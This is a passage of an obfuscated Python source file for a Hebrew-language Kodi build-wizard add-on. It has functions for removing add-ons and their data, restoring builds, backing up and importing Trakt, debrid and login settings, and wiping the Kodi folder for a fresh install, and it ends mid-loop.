			elif O000OOOO00OO00OO0 ==ACTION_NAV_BACK :O0OO00OO0000000OO .close ()#line:4647
	if default ==None :default =wiz .Grab_Log (True )#line:4648
	O0000OOOOOO0O00O0 =OOO000OOOOO00OOO0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4649
	O0000OOOOOO0O00O0 .doModal ()#line:4650
	del O0000OOOOOO0O00O0 #line:4651
def removeAddon (OOOOOOO0OO0O00OO0 ,O00O00OO000O00000 ,over =False ):#line:4653
	if not over ==False :#line:4654
		O0000OOO0O0OOO000 =1 #line:4655
	else :#line:4656
		O0000OOO0O0OOO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O00OO000O00000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOOOOOO0OO0O00OO0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4657
	if O0000OOO0O0OOO000 ==1 :#line:4658
		OO00O00OOOOO0OO00 =os .path .join (ADDONS ,OOOOOOO0OO0O00OO0 )#line:4659
		wiz .log ("Removing Addon %s"%OOOOOOO0OO0O00OO0 )#line:4660
		wiz .cleanHouse (OO00O00OOOOO0OO00 )#line:4661
		xbmc .sleep (1000 )#line:4662
		try :shutil .rmtree (OO00O00OOOOO0OO00 )#line:4663
		except Exception as O00OO0OOOO0O00O00 :wiz .log ("Error removing %s"%OOOOOOO0OO0O00OO0 ,xbmc .LOGNOTICE )#line:4664
		removeAddonData (OOOOOOO0OO0O00OO0 ,O00O00OO000O00000 ,over )#line:4665
	if over ==False :#line:4666
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00O00OO000O00000 ))#line:4667
def removeAddonData (OO0OOOOO00OOOOOO0 ,name =None ,over =False ):#line:4669
	if OO0OOOOO00OOOOOO0 =='all':#line:4670
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4671
			wiz .cleanHouse (ADDOND )#line:4672
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4673
	elif OO0OOOOO00OOOOOO0 =='uninstalled':#line:4674
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4675
			OO0O00000O0O00O00 =0 #line:4676
			for O0O0OO0O0O0O0O0O0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4677
				O000OOO00OO00O000 =O0O0OO0O0O0O0O0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4678
				if O000OOO00OO00O000 in EXCLUDES :pass #line:4679
				elif os .path .exists (os .path .join (ADDONS ,O000OOO00OO00O000 )):pass #line:4680
				else :wiz .cleanHouse (O0O0OO0O0O0O0O0O0 );OO0O00000O0O00O00 +=1 ;wiz .log (O0O0OO0O0O0O0O0O0 );shutil .rmtree (O0O0OO0O0O0O0O0O0 )#line:4681
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0O00000O0O00O00 ))#line:4682
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4683
	elif OO0OOOOO00OOOOOO0 =='empty':#line:4684
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4685
			OO0O00000O0O00O00 =wiz .emptyfolder (ADDOND )#line:4686
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0O00000O0O00O00 ))#line:4687
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4688
	else :#line:4689
		O0OOOO00OOOOOOO0O =os .path .join (USERDATA ,'addon_data',OO0OOOOO00OOOOOO0 )#line:4690
		if OO0OOOOO00OOOOOO0 in EXCLUDES :#line:4691
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4692
		elif os .path .exists (O0OOOO00OOOOOOO0O ):#line:4693
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOOO00OOOOOO0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4694
				wiz .cleanHouse (O0OOOO00OOOOOOO0O )#line:4695
				try :#line:4696
					shutil .rmtree (O0OOOO00OOOOOOO0O )#line:4697
				except :#line:4698
					wiz .log ("Error deleting: %s"%O0OOOO00OOOOOOO0O )#line:4699
			else :#line:4700
				wiz .log ('Addon data for %s was not removed'%OO0OOOOO00OOOOOO0 )#line:4701
	wiz .refresh ()#line:4702
def restoreit (OO0OO00OO0OOOO0O0 ):#line:4704
	if OO0OO00OO0OOOO0O0 =='build':#line:4705
		O0OOO0O0OOOO0OOO0 =freshStart ('restore')#line:4706
		if O0OOO0O0OOOO0OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4707
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4708
		wiz .skinToDefault ()#line:4709
	wiz .restoreLocal (OO0OO00OO0OOOO0O0 )#line:4710
def restoreextit (O00O0OOO000O00OOO ):#line:4712
	if O00O0OOO000O00OOO =='build':#line:4713
		OOO00OOOO000OO000 =freshStart ('restore')#line:4714
		if OOO00OOOO000OO000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4715
	wiz .restoreExternal (O00O0OOO000O00OOO )#line:4716
def buildInfo (O0000OO0OOO0OO0O0 ):#line:4718
	if wiz .workingURL (SPEEDFILE )==True :#line:4719
		if wiz .checkBuild (O0000OO0OOO0OO0O0 ,'url'):#line:4720
			O0000OO0OOO0OO0O0 ,O0O00OO0O0OO0O000 ,O00OO0OO0OO000OO0 ,O0O00O00O0OO0O000 ,O0000O0OOOO0OOOOO ,OO0O00000OO00OOOO ,OO0OOOO0O00O0O00O ,O000000000OO0OOO0 ,O00OO0O0O0OOOOOO0 ,OO0OO00OO0O00O000 ,O000OO0O0O0OOOOOO =wiz .checkBuild (O0000OO0OOO0OO0O0 ,'all')#line:4721
			OO0OO00OO0O00O000 ='Yes'if OO0OO00OO0O00O000 .lower ()=='yes'else 'No'#line:4722
			O00OOO00OOO00OOO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000OO0OOO0OO0O0 )#line:4723
			O00OOO00OOO00OOO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OO0O0OO0O000 )#line:4724
			if not OO0O00000OO00OOOO =="http://":#line:4725
				OOOO0OO00OOOOOOO0 =wiz .themeCount (O0000OO0OOO0OO0O0 ,False )#line:4726
				O00OOO00OOO00OOO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOO0OO00OOOOOOO0 ))#line:4727
			O00OOO00OOO00OOO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000O0OOOO0OOOOO )#line:4728
			O00OOO00OOO00OOO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OO00OO0O00O000 )#line:4729
			O00OOO00OOO00OOO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OO0O0O0OOOOOO )#line:4730
			wiz .TextBox (ADDONTITLE ,O00OOO00OOO00OOO0 )#line:4731
		else :wiz .log ("Invalid Build Name!")#line:4732
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4733
def buildVideo (O0O00OO000OO00O0O ):#line:4735
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4736
	if wiz .workingURL (SPEEDFILE )==True :#line:4737
		OOO00OO0000OO00OO =wiz .checkBuild (O0O00OO000OO00O0O ,'preview')#line:4738
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0O00OO000OO00O0O )#line:4739
		if OOO00OO0000OO00OO and not OOO00OO0000OO00OO =='http://':playVideo (OOO00OO0000OO00OO )#line:4740
		else :wiz .log ("[%s]Unable to find url for video preview"%O0O00OO000OO00O0O )#line:4741
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4742
def dependsList (O0O0O0O00O0OO0OOO ):#line:4744
	OOO0O0OO000OO00OO =os .path .join (ADDONS ,O0O0O0O00O0OO0OOO ,'addon.xml')#line:4745
	if os .path .exists (OOO0O0OO000OO00OO ):#line:4746
		OO00000O0O00OOO00 =open (OOO0O0OO000OO00OO ,mode ='r');OOOO0O0O0O00O00OO =OO00000O0O00OOO00 .read ();OO00000O0O00OOO00 .close ();#line:4747
		O0O0000O0O0O0O00O =wiz .parseDOM (OOOO0O0O0O00O00OO ,'import',ret ='addon')#line:4748
		O0OO0OO0OO00OO0O0 =[]#line:4749
		for OOOOO00O00OO0000O in O0O0000O0O0O0O00O :#line:4750
			if not 'xbmc.python'in OOOOO00O00OO0000O :#line:4751
				O0OO0OO0OO00OO0O0 .append (OOOOO00O00OO0000O )#line:4752
		return O0OO0OO0OO00OO0O0 #line:4753
	return []#line:4754
def manageSaveData (OO00O000000OOOOOO ):#line:4756
	if OO00O000000OOOOOO =='import':#line:4757
		OO000O00OO0O00O0O =os .path .join (ADDONDATA ,'temp')#line:4758
		if not os .path .exists (OO000O00OO0O00O0O ):os .makedirs (OO000O00OO0O00O0O )#line:4759
		O0OO0OO00O00OO0O0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4760
		if not O0OO0OO00O00OO0O0 .endswith ('.zip'):#line:4761
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4762
			return #line:4763
		O0O000O0O0O00O0OO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4764
		O00O00OOO000000O0 =xbmcvfs .copy (O0OO0OO00O00OO0O0 ,O0O000O0O0O00O0OO )#line:4765
		wiz .log ("%s"%str (O00O00OOO000000O0 ))#line:4766
		extract .all (xbmc .translatePath (O0O000O0O0O00O0OO ),OO000O00OO0O00O0O )#line:4767
		O00O00O0O0O0OO0O0 =os .path .join (OO000O00OO0O00O0O ,'trakt')#line:4768
		O0OOOOO000000OO0O =os .path .join (OO000O00OO0O00O0O ,'login')#line:4769
		O0O0O000OO0O00O0O =os .path .join (OO000O00OO0O00O0O ,'debrid')#line:4770
		OO0000O00000O00OO =0 #line:4771
		if os .path .exists (O00O00O0O0O0OO0O0 ):#line:4772
			OO0000O00000O00OO +=1 #line:4773
			O0O0OOO0000O0O000 =os .listdir (O00O00O0O0O0OO0O0 )#line:4774
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4775
			for OO00OO0O0OOO0O000 in O0O0OOO0000O0O000 :#line:4776
				OOOOOO0O00OOOO000 =os .path .join (traktit .TRAKTFOLD ,OO00OO0O0OOO0O000 )#line:4777
				O0OOO00OOOO000O00 =os .path .join (O00O00O0O0O0OO0O0 ,OO00OO0O0OOO0O000 )#line:4778
				if os .path .exists (OOOOOO0O00OOOO000 ):#line:4779
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO0O0OOO0O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4780
					else :os .remove (OOOOOO0O00OOOO000 )#line:4781
				shutil .copy (O0OOO00OOOO000O00 ,OOOOOO0O00OOOO000 )#line:4782
			traktit .importlist ('all')#line:4783
			traktit .traktIt ('restore','all')#line:4784
		if os .path .exists (O0OOOOO000000OO0O ):#line:4785
			OO0000O00000O00OO +=1 #line:4786
			O0O0OOO0000O0O000 =os .listdir (O0OOOOO000000OO0O )#line:4787
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4788
			for OO00OO0O0OOO0O000 in O0O0OOO0000O0O000 :#line:4789
				OOOOOO0O00OOOO000 =os .path .join (loginit .LOGINFOLD ,OO00OO0O0OOO0O000 )#line:4790
				O0OOO00OOOO000O00 =os .path .join (O0OOOOO000000OO0O ,OO00OO0O0OOO0O000 )#line:4791
				if os .path .exists (OOOOOO0O00OOOO000 ):#line:4792
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO0O0OOO0O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4793
					else :os .remove (OOOOOO0O00OOOO000 )#line:4794
				shutil .copy (O0OOO00OOOO000O00 ,OOOOOO0O00OOOO000 )#line:4795
			loginit .importlist ('all')#line:4796
			loginit .loginIt ('restore','all')#line:4797
		if os .path .exists (O0O0O000OO0O00O0O ):#line:4798
			OO0000O00000O00OO +=1 #line:4799
			O0O0OOO0000O0O000 =os .listdir (O0O0O000OO0O00O0O )#line:4800
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4801
			for OO00OO0O0OOO0O000 in O0O0OOO0000O0O000 :#line:4802
				OOOOOO0O00OOOO000 =os .path .join (debridit .REALFOLD ,OO00OO0O0OOO0O000 )#line:4803
				O0OOO00OOOO000O00 =os .path .join (O0O0O000OO0O00O0O ,OO00OO0O0OOO0O000 )#line:4804
				if os .path .exists (OOOOOO0O00OOOO000 ):#line:4805
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00OO0O0OOO0O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4806
					else :os .remove (OOOOOO0O00OOOO000 )#line:4807
				shutil .copy (O0OOO00OOOO000O00 ,OOOOOO0O00OOOO000 )#line:4808
			debridit .importlist ('all')#line:4809
			debridit .debridIt ('restore','all')#line:4810
		wiz .cleanHouse (OO000O00OO0O00O0O )#line:4811
		wiz .removeFolder (OO000O00OO0O00O0O )#line:4812
		os .remove (O0O000O0O0O00O0OO )#line:4813
		if OO0000O00000O00OO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4814
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4815
	elif OO00O000000OOOOOO =='export':#line:4816
		O0OOO000OOOO0O0O0 =xbmc .translatePath (MYBUILDS )#line:4817
		O0OO0O00OO0O0OOO0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4818
		traktit .traktIt ('update','all')#line:4819
		loginit .loginIt ('update','all')#line:4820
		debridit .debridIt ('update','all')#line:4821
		O0OO0OO00O00OO0O0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4822
		O0OO0OO00O00OO0O0 =xbmc .translatePath (O0OO0OO00O00OO0O0 )#line:4823
		O0000OO0000000O0O =os .path .join (O0OOO000OOOO0O0O0 ,'SaveData.zip')#line:4824
		O0OO00OO0OOO0O00O =zipfile .ZipFile (O0000OO0000000O0O ,mode ='w')#line:4825
		for O0000OOO0OOOO000O in O0OO0O00OO0O0OOO0 :#line:4826
			if os .path .exists (O0000OOO0OOOO000O ):#line:4827
				O0O0OOO0000O0O000 =os .listdir (O0000OOO0OOOO000O )#line:4828
				for OO0000O000OOOO000 in O0O0OOO0000O0O000 :#line:4829
					O0OO00OO0OOO0O00O .write (os .path .join (O0000OOO0OOOO000O ,OO0000O000OOOO000 ),os .path .join (O0000OOO0OOOO000O ,OO0000O000OOOO000 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4830
		O0OO00OO0OOO0O00O .close ()#line:4831
		if O0OO0OO00O00OO0O0 ==O0OOO000OOOO0O0O0 :#line:4832
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OO0000000O0O ))#line:4833
		else :#line:4834
			try :#line:4835
				xbmcvfs .copy (O0000OO0000000O0O ,os .path .join (O0OO0OO00O00OO0O0 ,'SaveData.zip'))#line:4836
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OO0OO00O00OO0O0 ,'SaveData.zip')))#line:4837
			except :#line:4838
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OO0000000O0O ))#line:4839
def freshStart (install =None ,over =False ):#line:4844
	if USERNAME =='':#line:4845
		ADDON .openSettings ()#line:4846
		sys .exit ()#line:4847
	O0OOOOOOOO0O00000 =(SPEEDFILE )#line:4848
	(O0OOOOOOOO0O00000 )#line:4849
	O00O00O00O0O0OO00 =(wiz .workingURL (O0OOOOOOOO0O00000 ))#line:4850
	(O00O00O00O0O0OO00 )#line:4851
	if KEEPTRAKT =='true':#line:4852
		traktit .autoUpdate ('all')#line:4853
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4854
	if KEEPREAL =='true':#line:4855
		debridit .autoUpdate ('all')#line:4856
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4857
	if KEEPLOGIN =='true':#line:4858
		loginit .autoUpdate ('all')#line:4859
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4860
	if over ==True :O0O00O00OO0O0OOOO =1 #line:4861
	elif install =='restore':O0O00O00OO0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4862
	elif install :O0O00O00OO0O0OOOO =1 #line:4863
	else :O0O00O00OO0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4864
	if O0O00O00OO0O0OOOO :#line:4865
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4866
			OOOO0OO00OO00O0OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4867
			skinSwitch .swapSkins (OOOO0OO00OO00O0OO )#line:4870
			O000000000OOO000O =0 #line:4871
			xbmc .sleep (1000 )#line:4872
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000000000OOO000O <150 :#line:4873
				O000000000OOO000O +=1 #line:4874
				xbmc .sleep (1000 )#line:4875
				wiz .ebi ('SendAction(Select)')#line:4876
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4877
				wiz .ebi ('SendClick(11)')#line:4878
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4879
			xbmc .sleep (1000 )#line:4880
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4881
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4882
			return #line:4883
		wiz .addonUpdates ('set')#line:4884
		O0O0O0O00O0OOO000 =os .path .abspath (HOME )#line:4885
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4886
		O0OOO00O0000O0OOO =sum ([len (O0O0OOOOO0OO0000O )for OOOOO0O00O00OO0OO ,O0O00OO000000O00O ,O0O0OOOOO0OO0000O in os .walk (O0O0O0O00O0OOO000 )]);OOO0OOOOO0O0OOO00 =0 #line:4887
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4888
		EXCLUDES .append ('My_Builds')#line:4889
		EXCLUDES .append ('archive_cache')#line:4890
		EXCLUDES .append ('script.module.requests')#line:4891
		EXCLUDES .append ('myfav.anon')#line:4892
		if KEEPREPOS =='true':#line:4893
			OOOO000OO000OOO0O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4894
			for OO000O000OOO0OO0O in OOOO000OO000OOO0O :#line:4895
				O0O00O00OOOO0OO00 =os .path .split (OO000O000OOO0OO0O [:-1 ])[1 ]#line:4896
				if not O0O00O00OOOO0OO00 ==EXCLUDES :#line:4897
					EXCLUDES .append (O0O00O00OOOO0OO00 )#line:4898
		if KEEPSUPER =='true':#line:4899
			EXCLUDES .append ('plugin.program.super.favourites')#line:4900
		if KEEPMOVIELIST =='true':#line:4901
			EXCLUDES .append ('plugin.video.metalliq')#line:4902
		if KEEPMOVIELIST =='true':#line:4903
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4904
		if KEEPADDONS =='true':#line:4905
			EXCLUDES .append ('addons')#line:4906
		if KEEPTELEMEDIA =='true':#line:4907
			EXCLUDES .append ('plugin.video.telemedia')#line:4908
		EXCLUDES .append ('plugin.video.elementum')#line:4913
		EXCLUDES .append ('script.elementum.burst')#line:4914
		EXCLUDES .append ('script.elementum.burst-master')#line:4915
		EXCLUDES .append ('plugin.video.quasar')#line:4916
		EXCLUDES .append ('script.quasar.burst')#line:4917
		EXCLUDES .append ('skin.estuary')#line:4918
		if KEEPWHITELIST =='true':#line:4921
			OO0OO0OO0000OOO0O =''#line:4922
			OOOOOO0OOOO000O00 =wiz .whiteList ('read')#line:4923
			if len (OOOOOO0OOOO000O00 )>0 :#line:4924
				for OO000O000OOO0OO0O in OOOOOO0OOOO000O00 :#line:4925
					try :O0O000O000OOO0O00 ,OOOO0OO00O000OO0O ,O0OOOOO0OOOO00000 =OO000O000OOO0OO0O #line:4926
					except :pass #line:4927
					if O0OOOOO0OOOO00000 .startswith ('pvr'):OO0OO0OO0000OOO0O =OOOO0OO00O000OO0O #line:4928
					OO00O0O00O0OOOOOO =dependsList (O0OOOOO0OOOO00000 )#line:4929
					for OO0O00O00O0OOOOOO in OO00O0O00O0OOOOOO :#line:4930
						if not OO0O00O00O0OOOOOO in EXCLUDES :#line:4931
							EXCLUDES .append (OO0O00O00O0OOOOOO )#line:4932
						OOOO0O00O0OO0OO00 =dependsList (OO0O00O00O0OOOOOO )#line:4933
						for OOOO0000O0O00O000 in OOOO0O00O0OO0OO00 :#line:4934
							if not OOOO0000O0O00O000 in EXCLUDES :#line:4935
								EXCLUDES .append (OOOO0000O0O00O000 )#line:4936
					if not O0OOOOO0OOOO00000 in EXCLUDES :#line:4937
						EXCLUDES .append (O0OOOOO0OOOO00000 )#line:4938
				if not OO0OO0OO0000OOO0O =='':wiz .setS ('pvrclient',O0OOOOO0OOOO00000 )#line:4939
		if wiz .getS ('pvrclient')=='':#line:4940
			for OO000O000OOO0OO0O in EXCLUDES :#line:4941
				if OO000O000OOO0OO0O .startswith ('pvr'):#line:4942
					wiz .setS ('pvrclient',OO000O000OOO0OO0O )#line:4943
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4944
		O00OO0OOOOOOOO000 =wiz .latestDB ('Addons')#line:4945
		for OO00OO0O0O0OO0OOO ,O0OO00O00O00O0OO0 ,O00O0O0000OO0000O in os .walk (O0O0O0O00O0OOO000 ,topdown =True ):#line:4946
			O0OO00O00O00O0OO0 [:]=[O0O000O0O0OO00000 for O0O000O0O0OO00000 in O0OO00O00O00O0OO0 if O0O000O0O0OO00000 not in EXCLUDES ]#line:4947
			for O0O000O000OOO0O00 in O00O0O0000OO0000O :#line:4948
				OOO0OOOOO0O0OOO00 +=1 #line:4949
				O0OOOOO0OOOO00000 =OO00OO0O0O0OO0OOO .replace ('/','\\').split ('\\')#line:4950
				O000000000OOO000O =len (O0OOOOO0OOOO00000 )-1 #line:4952
				if O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4953
				elif O0O000O000OOO0O00 =='MyVideos99.db'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4954
				elif O0O000O000OOO0O00 =='MyVideos107.db'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4955
				elif O0O000O000OOO0O00 =='MyVideos116.db'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4956
				elif O0O000O000OOO0O00 =='MyVideos99.db'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4957
				elif O0O000O000OOO0O00 =='MyVideos107.db'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4958
